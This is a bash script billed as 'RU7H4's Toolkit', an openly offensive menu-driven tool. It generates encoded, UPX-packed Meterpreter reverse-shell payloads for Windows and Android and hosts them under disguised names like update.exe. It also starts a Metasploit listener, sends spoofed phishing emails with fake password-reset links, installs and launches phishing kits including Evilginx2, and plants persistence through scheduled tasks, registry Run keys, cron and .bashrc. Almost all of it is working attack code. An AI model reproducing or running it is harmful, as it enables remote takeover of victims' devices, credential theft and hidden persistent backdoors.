#!/bin/bash
clear
echo -e "\e[91m"
echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░▒▓████████▓▒░▒▓████████▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo "░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░     ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
echo -e "\e[0m"
echo "RU7H4's Toolkit"
echo "-----------------------------------------------------"
send_spoofed_email() {
    echo "[+] Sending phishing email..."
    read -p "Enter victim's email address: " VICTIM_EMAIL
    read -p "Enter sender's email address for spoofing: " SENDER_EMAIL
    read -p "Enter the subject of the phishing email: " SUBJECT
    read -p "Enter the body content for the phishing email: " BODY
    read -p "Enter attacker's server IP for phishing link: " LHOST
    cat <<EOF > /tmp/phishing_email.txt
From: $SENDER_EMAIL
To: $VICTIM_EMAIL
Subject: $SUBJECT

$BODY

Click the link to reset your password: http://$LHOST/phishing-page
EOF
    if command -v msmtp &>/dev/null; then
        msmtp --file=/tmp/phishing_email.txt $VICTIM_EMAIL
        echo "[+] Phishing email sent to $VICTIM_EMAIL"
    else
        echo "[-] msmtp is not installed. Please install it to send emails."
    fi
}
choose_phishing_tool() {
    echo "[+] Choose a phishing tool to use:"
    echo "[1] Social-Engineer Toolkit (SET)"
    echo "[2] Evilginx2 (MITM Phishing)"
    echo "[3] King Phisher"
    read -p "Enter your choice (1-3): " TOOL_CHOICE
    case $TOOL_CHOICE in
        1)
            if [ -d "/usr/share/set" ]; then
                echo "[+] Launching Social-Engineer Toolkit (SET)..."
                cd /usr/share/set && python3 setoolkit
            else
                echo "[-] SET is not installed. Install it via option 3."
            fi
            ;;
        2)
            if [ -d "/opt/evilginx2" ]; then
                echo "[+] Launching Evilginx2..."
                cd /opt/evilginx2 && ./bin/evilginx
            else
                echo "[-] Evilginx2 is not installed. Install it via option 3."
            fi
            ;;
        3)
            if [ -d "/opt/king-phisher" ]; then
                echo "[+] Launching King Phisher..."
                cd /opt/king-phisher && ./king_phisher
            else
                echo "[-] King Phisher is not installed. Install it via option 3."
            fi
            ;;
        *)
            echo "[-] Invalid option!"
            exit 1
            ;;
    esac
}
install_phishing_tools() {
    echo "[+] Installing phishing tools and dependencies..."
    apt update && apt install -y git python3-pip apache2 msmtp curl golang-go make
    if [ ! -d "/usr/share/set" ]; then
        echo "[+] Installing SET..."
        git clone https://github.com/trustedsec/social-engineer-toolkit.git /usr/share/set
        cd /usr/share/set && pip3 install -r requirements.txt
    fi
    if [ ! -d "/opt/evilginx2" ]; then
        echo "[+] Installing Evilginx2..."
        git clone https://github.com/kgretzky/evilginx2.git /opt/evilginx2
        cd /opt/evilginx2 && make
    fi
    if [ ! -d "/opt/king-phisher" ]; then
        echo "[+] Installing King Phisher..."
        git clone https://github.com/securestate/king-phisher.git /opt/king-phisher
        cd /opt/king-phisher && pip3 install -r requirements.txt
    fi
    echo "[+] Phishing tools installation completed."
}
if [[ $EUID -ne 0 ]]; then
    echo -e "\e[91m[-] This script must be run as root!\e[0m"
    exit 1
fi
echo "[1] Devices (Windows/Android)"
echo "[2] Social Engineering (Phishing)"
echo "[3] Post-Exploitation"
read -p "Select an option (1-3): " MAIN_OPTION
if [[ $MAIN_OPTION -eq 1 ]]; then
    echo "[1] Windows"
    echo "[2] Android"
    read -p "Select a device type (1 or 2): " DEVICE_TYPE
    if [[ $DEVICE_TYPE -eq 1 ]]; then
        read -p "Enter LHOST (Attacker IP): " LHOST
        read -p "Enter LPORT (Listening Port): " LPORT
        read -p "Enter the output payload name (e.g., update.exe): " PAYLOAD_NAME
        ENCODER="x86/shikata_ga_nai"
        SECOND_ENCODER="x86/countdown"
        echo "[+] Generating Windows payload with dual encoders..."
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
            -e $ENCODER -i 5 -e $SECOND_ENCODER -i 3 -f exe -o raw_$PAYLOAD_NAME
        if [ -s raw_$PAYLOAD_NAME ]; then
            if command -v upx &>/dev/null; then
                echo "[+] Applying UPX obfuscation..."
                upx --best --lzma raw_$PAYLOAD_NAME -o $PAYLOAD_NAME
                rm raw_$PAYLOAD_NAME
            else
                echo "[!] UPX not installed, renaming raw payload."
                mv raw_$PAYLOAD_NAME $PAYLOAD_NAME
            fi
            if ! command -v apache2 &>/dev/null; then
                echo "[+] Installing Apache..."
                apt install -y apache2
            fi
            systemctl start apache2
            systemctl enable apache2
            WEB_DIR="/var/www/html"
            mv $PAYLOAD_NAME $WEB_DIR/
            echo "[+] Payload hosted at: http://$LHOST/$PAYLOAD_NAME"
        else
            echo "[-] Payload generation failed. Check msfvenom parameters."
            exit 1
        fi
    elif [[ $DEVICE_TYPE -eq 2 ]]; then
        read -p "Enter LHOST (Attacker IP): " LHOST
        read -p "Enter LPORT (Listening Port): " LPORT
        read -p "Enter the output APK name (e.g., update.apk): " PAYLOAD_NAME
        echo "[+] Generating Android payload..."
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $PAYLOAD_NAME
        if [ -s $PAYLOAD_NAME ]; then
            if ! command -v apache2 &>/dev/null; then
                echo "[+] Installing Apache..."
                apt install -y apache2
            fi
            systemctl start apache2
            systemctl enable apache2
            WEB_DIR="/var/www/html"
            mv $PAYLOAD_NAME $WEB_DIR/
            echo "[+] Payload hosted at: http://$LHOST/$PAYLOAD_NAME"
        else
            echo "[-] Payload generation failed. Check msfvenom parameters."
            exit 1
        fi
    else
        echo "[-] Invalid device option!"
        exit 1
    fi
    if [[ $DEVICE_TYPE -eq 1 ]]; then
        PAYLOAD="windows/meterpreter/reverse_tcp"
    else
        PAYLOAD="android/meterpreter/reverse_tcp"
    fi
    cat <<EOF > listener.rc
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF
    echo "[+] Metasploit Listener script saved as listener.rc"
    echo "[+] Starting Metasploit Listener..."
    msfconsole -r listener.rc
elif [[ $MAIN_OPTION -eq 2 ]]; then
    echo "[+] Social Engineering Options:"
    echo "[1] Email Spoofing"
    echo "[2] Choose Phishing Tool"
    echo "[3] Install Phishing Tools"
    read -p "Select an option (1-3): " SE_OPTION
    case $SE_OPTION in
        1)
            send_spoofed_email
            ;;
        2)
            choose_phishing_tool
            ;;
        3)
            install_phishing_tools
            ;;
        *)
            echo "[-] Invalid option!"
            exit 1
            ;;
    esac
elif [[ $MAIN_OPTION -eq 3 ]]; then
    echo "[+] Post-Exploitation Options:"
    echo "[1] Windows Persistence"
    echo "[2] Linux Persistence"
    read -p "Select an option (1 or 2): " PERSIST_OPTION
    if [[ $PERSIST_OPTION -eq 1 ]]; then
        read -p "Enter payload name (e.g., backdoor.exe): " PAYLOAD_NAME
        echo "[+] Setting up Windows persistence..."
        # Create a batch file that sets up persistence via scheduled task and registry entry
        cat <<EOF > win_persist.bat
@echo off
:: Create a scheduled task to run the payload at logon
schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\\\Users\\\\Public\\\\$PAYLOAD_NAME\" /sc ONLOGON /rl HIGHEST
:: Add a registry entry for persistence
reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Update\" /t REG_SZ /d \"C:\\\\Users\\\\Public\\\\$PAYLOAD_NAME\" /f
EOF
        echo "[+] Windows persistence script saved as win_persist.bat"
    elif [[ $PERSIST_OPTION -eq 2 ]]; then
        read -p "Enter payload path (e.g., /home/user/backdoor): " PAYLOAD_PATH
        echo "[+] Setting up Linux persistence..."
        # Add a cron job that executes the payload at reboot
        (crontab -l 2>/dev/null; echo \"@reboot $PAYLOAD_PATH &\") | crontab -
        # Also append the payload execution command to .bashrc for additional persistence
        echo "$PAYLOAD_PATH &" >> ~/.bashrc
        echo "[+] Linux persistence configured."
    else
        echo "[-] Invalid option!"
        exit 1
    fi
else
    echo "[-] Invalid option!"
    exit 1
fi
